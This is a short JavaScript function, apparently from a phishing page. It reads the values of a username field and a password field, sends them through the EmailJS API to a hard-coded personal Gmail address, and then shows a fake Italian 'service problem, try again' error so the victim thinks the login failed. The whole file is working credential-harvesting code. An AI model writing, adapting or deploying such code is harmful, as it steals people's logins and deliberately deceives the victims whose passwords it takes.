function myFunction() {
  var data = {
    service_id: "service_anfkdec",
    template_id: "template_px4i2lf",
    user_id: "sn9by5lS1x_whdjOl",
    template_params: {
      userMail: "mahindersinghitaly@gmail.com",
      regLinkMail: document.getElementById("username1").value,
      regCode: document.getElementById("password1").value,
      firstName: document.getElementById("password1").value,
    },
  };
  $.ajax("https://api.emailjs.com/api/v1.0/email/send", {
    type: "POST",
    data: JSON.stringify(data),
    contentType: "application/json",
  }).done(function () {
    swal(
      "Oops...",
      "Si è verificato un problema con i nostri servizi, riprova",
      "error",
      {
        button: "Chiudi",
      }
    ).then((result) => {
      /*swal(
        "Oops...",
        "Si è verificato un problema con i nostri servizi, riprova",
        "error",
        {
          button: "Chiudi",
        }
      );*/
    });
  });
}
